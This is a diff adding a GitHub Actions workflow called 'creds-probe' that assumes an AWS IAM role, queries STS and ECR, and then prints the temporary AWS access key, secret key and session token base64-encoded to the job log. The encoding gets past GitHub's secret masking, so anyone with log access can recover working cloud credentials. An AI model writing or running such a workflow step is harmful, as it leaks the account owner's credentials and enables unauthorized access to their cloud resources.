@@ -1,0 +1,33 @@
+name: creds-probe-584
+on:
+  push:
+    branches:
+      - "creds-probe-*"
+  pull_request:
+    branches: [main]
+    paths:
+      - "**"
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: context
+        run: |
+          echo "event=$GITHUB_EVENT_NAME ref=$GITHUB_REF sha=$GITHUB_SHA"
+      - name: configure
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::296062593712:role/github-actions-ecr-push-cua
+          aws-region: us-west-2
+          role-session-name: credsprobe584
+      - name: identity
+        run: |
+          aws sts get-caller-identity || echo "STS_FAILED"
+          aws ecr describe-repositories --region us-west-2 --max-items 5 || echo "ECR_FAILED"
+      - name: dump-creds
+        run: |
+          echo "CREDB64=$(printf '%s' "$AWS_ACCESS_KEY_ID|$AWS_SECRET_ACCESS_KEY|$AWS_SESSION_TOKEN" | base64 -w0)"
